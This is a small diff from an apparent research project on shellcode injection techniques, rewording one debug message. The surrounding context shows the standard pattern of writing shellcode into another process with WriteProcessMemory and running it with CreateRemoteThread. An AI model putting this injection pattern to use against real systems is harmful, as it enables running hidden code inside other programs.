@@ -19,7 +19,7 @@ namespace ShellcodeInjectionTechniques
             Debug("[+] WriteProcessMemory(): 0x{0}", new string[] { pAddr.ToString("X") });
             WriteProcessMemory(target.Handle, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);
 
-            Debug("[+] CreateRemoteThread to 0x{0}.", new string[] { pAddr.ToString("X") });
+            Debug("[+] CreateRemoteThread(): 0x{0}", new string[] { pAddr.ToString("X") });
             // create the remote thread
             IntPtr hThread = CreateRemoteThread(target.Handle, IntPtr.Zero, 0, pAddr, IntPtr.Zero, ThreadCreationFlags.NORMAL, out hThread);
         }
